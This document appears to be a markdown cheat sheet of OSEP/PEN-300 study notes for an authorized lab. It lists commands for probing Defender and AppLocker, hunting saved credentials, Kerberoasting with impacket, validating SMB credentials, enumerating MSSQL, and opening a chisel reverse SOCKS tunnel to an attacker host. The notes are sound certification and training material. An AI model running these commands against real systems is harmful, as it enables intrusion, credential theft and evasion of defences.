---
title: OSEP
---

# OSEP

PEN-300 field notes for an authorized lab. Work top-down: understand controls,
choose the least fragile execution path, establish identity, then move only when
the next hop has a clear purpose.

## Workspace and variables

```bash
# Create a case workspace without scattering output around the host
export CASE=target01 LHOST=192.0.2.10 LPORT=443
mkdir -p "$CASE"/{recon,loot,src,bin}

# Start a transcript of the terminal session
script -af "$CASE/terminal.log"
```

```powershell
# Record host, identity, language mode, and PowerShell version
hostname; whoami /all
$ExecutionContext.SessionState.LanguageMode
$PSVersionTable
```

## Development and payload plumbing

```bash
# Compile a release C# assembly and inspect its architecture
dotnet new console -n Runner
dotnet build Runner -c Release
file Runner/bin/Release/*/Runner.dll

# Compile a small Windows executable from Linux
x86_64-w64-mingw32-gcc runner.c -o runner.exe -O2
```

```powershell
# Inspect the current process architecture before choosing a payload
[Environment]::Is64BitProcess
[Environment]::Is64BitOperatingSystem

# Encode a lab PowerShell command as UTF-16LE for powershell.exe
$cmd = 'Write-Output "lab test"'
[Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($cmd))
```

## Control discovery

```powershell
# Inspect Defender state and logged detections
Get-MpComputerStatus
Get-MpThreatDetection | Select-Object InitialDetectionTime,ThreatName,Resources

# Enumerate AppLocker policy and effective rules
Get-AppLockerPolicy -Effective | Select-Object -ExpandProperty RuleCollections

# Check common writable locations and PATH entries
$env:PATH -split ';'
Get-Acl $env:TEMP, 'C:\Windows\Tasks' | Format-List
```

```cmd
REM Identify WDAC/AppLocker-related services and policy directories
sc query appidsvc
dir C:\Windows\System32\CodeIntegrity
```

Treat an execution failure as evidence: record the file type, architecture,
parent process, command line, policy result, and detection time before changing
more than one variable.

## Host and credential context

```powershell
# Enumerate sessions, token privileges, and saved credentials
quser
whoami /priv
cmdkey /list

# Find user-created scripts and unattended configuration
Get-ChildItem C:\Users -Include *.ps1,*.bat,*.cmd,*.config,*.xml -File -Recurse -ErrorAction SilentlyContinue
```

```cmd
REM Inspect services and scheduled tasks for actionable execution paths
wmic service get Name,StartName,PathName,StartMode
schtasks /query /fo LIST /v
```

## Active Directory and lateral movement

```powershell
# Query the domain and discover domain controllers with built-in tooling
[System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
nltest /dclist:$env:USERDNSDOMAIN

# Locate SPNs and delegation settings without third-party modules
setspn -Q */*
Get-ADComputer -Filter * -Properties TrustedForDelegation,TrustedToAuthForDelegation | Select Name,TrustedForDelegation,TrustedToAuthForDelegation

# Confirm the current Kerberos ticket cache
klist
```

```bash
# Enumerate SMB and validate one credential against a scoped target list
nxc smb targets.txt -u analyst -p 'PASSWORD' --shares
nxc smb targets.txt -u analyst -p 'PASSWORD' --sessions

# Request service tickets for accounts with SPNs in the lab domain
impacket-GetUserSPNs -request -dc-ip 192.0.2.20 LAB.LOCAL/analyst:'PASSWORD'
```

## MSSQL and constrained paths

```bash
# Discover SQL Server instances and authenticate explicitly
nmap -Pn -p1433 --script ms-sql-info 192.0.2.0/24
impacket-mssqlclient 'LAB/analyst:PASSWORD@192.0.2.30' -windows-auth
```

```sql
-- Identify the SQL login, role, linked servers, and databases
SELECT SYSTEM_USER, IS_SRVROLEMEMBER('sysadmin');
EXEC sp_linkedservers;
SELECT name FROM sys.databases;
```

```powershell
# Show local firewall policy and listening sockets before selecting a tunnel
Get-NetFirewallProfile
Get-NetFirewallRule -Enabled True | Select-Object DisplayName,Direction,Action
Get-NetTCPConnection -State Listen
```

```bash
# Start a reverse SOCKS tunnel in an authorized lab
./chisel server --reverse --port 8080

# Route a local SOCKS proxy through the established session
./chisel client 192.0.2.10:8080 R:socks
```

## Fast review

- Can the candidate execution path survive the discovered controls?
- Does payload architecture match the host and parent process?
- Which identity, token, and ticket cache is actually in use?
- Is the next hop reachable directly, through SQL, or through a tunnel?
- Did one controlled change explain each success or failure?

## References

- [Official PEN-300 syllabus](https://manage.offsec.com/app/uploads/2026/03/PEN-300_Syllabus.pdf)
- [The-Viper-One OSEP notes](https://github.com/The-Viper-One/OSEP-Notes)
- [Cipher7 OSEP notes](https://github.com/Cipher7/OSEP)
